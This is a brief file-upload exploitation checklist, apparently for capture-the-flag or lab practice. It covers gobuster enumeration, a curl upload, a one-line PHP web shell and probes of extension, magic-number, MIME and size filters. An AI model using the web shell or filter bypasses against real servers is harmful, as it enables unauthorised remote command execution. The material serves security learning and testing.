# Upload Exploitation Procedure
Take the following steps to begin exploiting file uploads.

## 1. Scan the application
This can be done by creating valid user accounts or by using `gobuster`

- Framework / Platform
- Server (determines payload)
- 3rd party scripts / plugins
- Location of file upload form
- Client side scripts may hint towards backend filters

```sh
gobuster dir -u 10.10.10.10/content -w wordlist -x php,jpg
```

## 2. Upload a valid file
- Where can the uploaded image be accessed? 
```sh
curl -i -X POST -F "fieldname=@shell.php" 10.10.10.10
```

## 3. Attempt a malicious payload
A simple PHP payload saved as shell.php. This should not work at all, but worth a try.

```php
<?php
system($_GET['cmd']);
```

## 4. Invalid extensions
Try a completely invalid extension like `image.invalid`. 

| Upload Status | Extension Filter |
| ------------- | ------ |
| Success | Blacklist |
| Fail | Whitelist |

## 5. Magic numbers
Take the valid file and change the magic numbers to a file you would expect to be blocked. If the upload fails then you know they are filtering by magic numbers.

## 6. MIME Type
Take the valid file and change the MIME type to a file you would expect to be blocked. This can be done using burp suite or by sending the file directly to the endpoint.

```php
<?php
header('Content-Type: application/pdf');
```
## 7. File length
Upload progressively bigger files until you hit the filter. Craft a payload within those limits.

